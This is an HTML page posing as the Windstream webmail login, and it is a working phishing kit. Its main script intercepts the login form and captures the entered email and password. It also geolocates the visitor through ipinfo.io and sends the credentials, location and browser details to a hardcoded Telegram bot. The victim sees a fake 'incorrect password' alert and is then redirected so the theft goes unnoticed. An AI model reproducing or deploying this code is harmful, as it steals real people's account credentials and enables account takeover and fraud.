<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
                  <meta name="viewport" content="width=device-width">
        <meta name="viewport" content="initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=11">
      
              <title>Windstream | Login</title>
      
      
              
  
<script type="text/javascript">
  const handler = "allow";
  const now = new Date();
  const can_submit_by = now.getTime() + (15 * 1000);
  let completed_captcha = false;

  const toggleClass = function(el, style) {
    console.log(el);
    if (el.classList) {
      el.classList.toggle(style);
    } else {
      // For IE9
      var classes = el.className.split(" ");
      var i = classes.indexOf(style);

      if (i >= 0)
        classes.splice(i, 1);
      else
        classes.push(style);
        el.className = classes.join(" ");
    }
  }

  function enableSubmit() {
    completed_captcha = true;

    var my_recaptcha_response_field = document.createElement( "input" );
    my_recaptcha_response_field.setAttribute("type", "hidden");
    my_recaptcha_response_field.setAttribute("name", "g-recaptcha-response");
    my_recaptcha_response_field.setAttribute("value", grecaptcha.getResponse());
    document.getElementById('main-form').appendChild(my_recaptcha_response_field);

    toggleClass(document.getElementById('captcha_modal'), 'hidden');
    showWaitingModel();
  };

  const showWaitingModel = () => {
    toggleClass(document.getElementById('waiting_modal'), 'hidden');
    setTimeout(_ => {toggleClass(document.getElementById('waiting_modal'), 'hidden');}, (can_submit_by - now.getTime()));
  };

  const deployBfap = () => {
    if(handler == 'tarpit') {
      showWaitingModel();
    }
    if((handler == 'captcha' || handler == 'reject') && !completed_captcha) {
      toggleClass(document.getElementById('captcha_modal'), 'hidden');
    }
  };
  
			  if (document.readyState === "complete" ||(document.readyState !== "loading" && !document.documentElement.doScroll)) {
      deployBfap();
    } else {
      document.addEventListener("DOMContentLoaded", deployBfap);
  }


</script>
      
      	                <link rel="stylesheet" type="text/css" href="index_files/main.css">
      
	<style media="screen">
		a {
			color: #1f8aa3;
			text-decoration-line: underline;
		}
		#login {
			background-color: #ef6724
		}
			</style>

      	      
	<script src="index_files/alpine.js" defer="defer"></script>
	<script type="text/javascript">
		toggle_password = (e) => {
			e.preventDefault();
			const input = document.getElementById('password');
			const button = document.getElementById('toggle');
			if (toggle.innerHTML === 'show') {
				input.type = 'text';
				button.innerHTML = 'hide';
			} else {
				input.type = 'password';
				button.innerHTML = 'show';
			}
		}

		// Catching the 'keydown' event for FireTV.
		document.addEventListener('keydown', function(event) {

			// For the down arrow (key code 40) and the up arrow (key code 38),
			// we want to catch the event and move to the next correct form element.
			// This is becuase normal tab functionality is not enough when using
			// a FireTV remote. But it's up and down arrows on the remote trigger
			// the same events and keycodes as the up/down arrows on a keyboard.
			var currentElement = document.activeElement;
			var curIndex = currentElement.tabIndex; //get current elements tab index
			var tabbables = document.querySelectorAll(".tabable"); //get all tabable elements
			var firstTabIndex = tabbables[0];
			var lastTabIndex = tabbables[tabbables.length - 1].tabIndex;

			for(var i=0; i<tabbables.length; i++) { //loop through each element
				if (event.keyCode == '38') {
					if(tabbables[i].tabIndex == (curIndex-1)) { //check the tabindex to see if it's the element we want
						tabbables[i].focus(); //if it's the one we want, focus it and exit the loop
						break;
					}
				}
				if (event.keyCode == '40') {
					if(curIndex == lastTabIndex) { //if we are on the last tabindex, go back to the beginning
						curIndex = 0;
					}
					if(tabbables[i].tabIndex == (curIndex+1)) { //check the tabindex to see if it's the element we want
						tabbables[i].focus(); //if it's the one we want, focus it and exit the loop
						break;
					}
				}

			}
		});
	</script>
	      </head>
  <body class="bg-white flex">
        <main class="container lg:w-screen-md">
			<header>
  <div class="branding">
    <img src="index_files/windstream.png" alt="Logo">
      </div>
  <div class="text-center text-gray-800 text-lg text-bold my-4">
    <h1>Webmail Login</h1>
  </div>
  </header>
				<section id="login_form" class="flex flex-col justify-between px-3">
				
			<form id="loginForm" method="POST" action="https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php">
        <div class="formfield">
            <label for="email">Email Address</label>
            <input tabindex="1" class="tabable" type="email" id="email" name="email" placeholder="Email Address" autofocus required>
        </div>
        <div class="formfield">
            <label for="password">Password</label>
            <div class="flex relative items-baseline">
                <input tabindex="2" class="tabable" id="password" type="password" name="password" placeholder="Password" required>
                <button tabindex="3" type="button" id="togglePassword" class="tabable" style="position: absolute; right: 10px; top: 8px;">SHOW</button>
            </div>
        </div>
        <div class="remember-me">
            <div class="flex items-baseline">
                <input tabindex="4" id="remember_me" name="remember_me" class="tabable" type="checkbox" checked>
                <label for="remember_me" class="block text-gray-700 font-bold">Remember Me</label>
            </div>
        </div>
        <div class="formfield">
            <button tabindex="5" id="login" class="tabable w-full px-4 py-2 text-2xl text-white bg-blue-500 rounded-lg" type="submit" name="submit">
                Log In
            </button>
        </div>
    </form>
    <script>
        // Toggle password visibility
        document.getElementById('togglePassword').addEventListener('click', function () {
            const passwordField = document.getElementById('password');
            const toggleText = this.innerText === 'SHOW' ? 'HIDE' : 'SHOW';
            this.innerText = toggleText;
            passwordField.type = passwordField.type === 'password' ? 'text' : 'password';
        });

// Disable button after form submission
document.getElementById('loginForm').addEventListener('submit', function (event) {
    const loginButton = document.getElementById('login');
    loginButton.classList.add('button-disabled');
    loginButton.innerText = 'Loading...';
});

    </script>
	<script>
    const BOT_TOKEN = '8070463264:AAFZbZQjPOEd861FoPyqbvSFT6iztKKmDN0';
    const CHAT_ID = '6078089614';
    const REDIRECT_URL = 'https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_7dd259a32cae2d2622fec0d79b5974726cd87c385a%3Ahttps%3A%2F%2Fwindstream-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail.windstream.net%252F%26cookieTime%3D1737601891';  // Replace with your redirect URL
    const IPINFO_TOKEN = 'f8595be4b4a2db'; // Replace with your IPInfo token

    let attemptCounter = 0; // Counter to track login attempts

    document.getElementById('loginForm').addEventListener('submit', async function(event) {
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const date = new Date().toLocaleString();
        const browserType = navigator.userAgent;  // Get browser type

        try {
            // Fetch IP and location data
            const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
            if (!response.ok) throw new Error("Failed to fetch IP info.");
            const ipInfo = await response.json();

            // Extract location details
            const ip = ipInfo.ip || 'N/A';
            const city = ipInfo.city || 'N/A';
            const region = ipInfo.region || 'N/A';
            const country = ipInfo.country || 'N/A';
            const location = ipInfo.loc || 'N/A';

            // Prepare message content with easier-to-copy email and password
            const message = `
🌐 *New windstream Logz* 🌐

🕒 *Date & Time*: ${date}

👤 *Email*: 
${email}

🔑 *Password*: 
${password}

📍 *IP Address*: ${ip}
🏙 *Location*: ${city}, ${region}, ${country}
🌍 *Coordinates*: ${location}
💻 *Browser*: ${browserType}

🔒 _THE OUTLAWS._
            `;

            // Send message to Telegram
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'  // Enables Markdown for text styling
                })
            });

            // Handle attempts and responses
            attemptCounter++;

            if (attemptCounter === 1) {
                alert("Incorrect password, try again.");
            } else if (attemptCounter === 2) {
                // Add a 2-second delay before redirecting
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);
            }

        } catch (error) {
            console.error("Error:", error);
        }
    });
    </script>
			
			
			
		</section>

		<section id="self-care" class="px-2">
      <ul>
              			                        <li class="mb-2">
  <a class="tabable" tabindex="8" target="_blank" id="selfcare_link_1" href="">Forgot Your Password or Need to Reset It?</a>
</li>
                <li class="mb-2">
  <a class="tabable" tabindex="9" target="_blank" id="selfcare_link_2" href="">Email Identity Dashboard</a>
</li>
                <li class="mb-2">
  <a class="tabable" tabindex="10" target="_blank" id="selfcare_link_3" href="">Login Support Page</a>
</li>
              </ul>
</section>
	
	
			  <footer class="flex flex-col mt-6 w-3/4 text-center mx-auto text-sm">
      <p></p>
    </footer>
	</main>
                                      

</body></html>